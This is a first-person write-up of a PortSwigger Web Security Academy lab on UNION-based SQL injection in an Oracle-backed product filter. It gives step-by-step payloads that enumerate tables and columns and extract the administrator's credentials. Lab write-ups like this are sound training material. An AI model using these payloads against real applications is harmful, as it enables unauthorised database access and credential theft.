# PortSwigger Web Security Academy - Lab Write-up

## Lab Name
SQL injection attack, listing the database contents on Oracle

## Difficulty
 (Practitioner)

## Objective
The goal of this lab is to log in as the `administrator` user by exploiting a SQL Injection vulnerability in the product category filter to extract the database structure, table names, column names, and passwords from an **Oracle** database.

---

## Method of Exploitation (Step-by-Step)

### Step 1: Detect SQL Injection & Determine Number of Columns
First, I intercepted a category filter request using **Burp Suite** and sent it to the **Repeater**. 
Since Oracle requires every `SELECT` statement to have a `FROM` clause, I used the built-in `dual` table to verify columns and data types:

```sql
Pets'+UNION+SELECT+'abc',+'def'+FROM+dual-- 
```
**Result:** The server responded with a `200 OK`, proving the backend query has **2 columns** and both support **string (text) data**.

---

### Step 2: Enumerate Table Names
On Oracle databases, table structures are stored in `all_tables`. I crafted a payload to list all table names. Note that Oracle table names are stored in **UPPERCASE**:

```sql
Pets'+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
```
**Result:** By searching the response for `USERS_`, I discovered the target users table: **`USERS_KBUVGU`**.

---

### Step 3: Enumerate Column Names
Next, I queried `all_tab_columns` to find the exact column names belonging to the `USERS_KBUVGU` table (ensuring the table name was passed in uppercase):

```sql
Pets'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_KBUVGU'-- 
```
**Result:** Inside the response, I located two critical uppercase column names:
1. Username Column: **`USERNAME_ZXARKH`**
2. Password Column: **`PASSWORD_LPMGBH`**

---

### Step 4: Extract Data (Data Exfiltration)
With the correct table and column names, I crafted the final query to exfiltrate the credentials:

```sql
Pets'+UNION+SELECT+USERNAME_ZXARKH,+PASSWORD_LPMGBH+FROM+USERS_KBUVGU-- 
```
**Result:** The application displayed the credentials on the webpage. I successfully recovered the administrator account details.

---

## Lab Resolution
I navigated to the **My Account** section of the website, logged in using the extracted `administrator` credentials, and successfully solved the lab.

## Key Takeaways
* Learned the specific syntax requirements for Oracle SQL Injection (mandatory `FROM` clause and using the `dual` table).
* Mastered Oracle schema enumeration using `all_tables` and `all_tab_columns`.
* Understood that Oracle databases treat table and column schema identifiers as strictly **case-sensitive UPPERCASE** during queries.
